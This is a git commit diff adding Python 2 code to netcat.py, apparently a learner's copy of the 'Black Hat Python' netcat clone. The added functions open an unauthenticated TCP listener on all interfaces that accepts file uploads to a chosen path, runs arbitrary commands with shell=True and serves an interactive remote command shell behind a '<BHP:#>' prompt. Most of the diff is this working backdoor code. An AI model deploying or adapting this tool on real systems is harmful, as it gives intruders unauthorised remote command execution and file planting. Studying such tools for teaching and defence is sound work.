0cf9f3b8ba57749e45efa118acce7bfd4ad55512
root <root@ubuntu-VirtualBox.(none)>
2017-04-05 19:49:40 +0200

    netcat

--- netcat.py
+++ netcat.py
@@ -73,6 +73,7 @@ def main():
         # to stdin
         buffer = sys.stdin.read()
         # send data off
+        buffer = raw_input("")
         client_sender(buffer)
         # we are going to listen and potentially
         # upload things, execute commands, and drop a shell back
@@ -80,5 +81,113 @@ def main():
     if listen:
         pass
         #server_loop() 
+
+
+def client_sender(buffer):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        # connect to our target host
+        #host = socket.gethostbyname("localhost")
+        client.connect((target,port))
+        if len(buffer):
+            client.send(buffer)
+            print "Envio buffer"
+        while True:
+            # now wait for data back
+            recv_len = 1
+            response = ""
+            while recv_len:
+                data = client.recv(4096)
+                recv_len = len(data)
+                response+= data
+                if recv_len < 4096:
+                    break
+            print response,
+            # wait for more input
+            buffer = raw_input("Nuevo comando")
+            buffer += "\n"
+            # send it off
+            client.send(buffer)
+    except:
+        print "[*] Exception! Exiting."
+        # tear down the connection
+        client.close()
+
+
+def server_loop():
+    global target
+    # if no target is defined, we listen on all interfaces
+    if not len(target):
+        target = "0.0.0.0"
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((target,port))
+    server.listen(5)
+    while True:
+        client_socket, addr = server.accept()
+        # spin off a thread to handle our new client
+        client_thread = threading.Thread(target=client_handler,
+        args=(client_socket,))
+        client_thread.start()
+
+
+def run_command(command):
+    # trim the newline
+    command = command.rstrip()
+    # run the command and get the output back
+    try:
+        output = subprocess.check_output(command,stderr=subprocess.
+    STDOUT, shell=True)
+    except:
+        output = "Failed to execute command.\r\n"
+    # send the output back to the client
+    return output
+
+
+
+def client_handler(client_socket):
+    global upload
+    global execute
+    global command
+    # check for upload
+    if len(upload_destination):
+        # read in all of the bytes and write to our destination
+        file_buffer = ""
+        # keep reading data until none is available
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+            else:
+                file_buffer += data
+        # now we take these bytes and try to write them out
+        try:
+            file_descriptor = open(upload_destination,"wb")
+            file_descriptor.write(file_buffer)
+            file_descriptor.close()
+            # acknowledge that we wrote the file out
+            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
+        except:
+            client_socket.send("Failed to save file to %s\r\n" %
+            upload_destination)
+        # check for command execution
+    if len(execute):
+        # run the command
+        output = run_command(execute)
+        client_socket.send(output)
+        # now we go into another loop if a command shell was requested
+    if command:
+        while True:
+            # show a simple prompt
+            client_socket.send("<BHP:#> ")
+            # now we receive until we see a linefeed
+            #(enter key)
+            cmd_buffer = ""
+            while "\n" not in cmd_buffer:
+                cmd_buffer += client_socket.recv(1024)
+            # send back the command output
+            response = run_command(cmd_buffer)
+            # send back the response
+            client_socket.send(response)
+
 
 main()
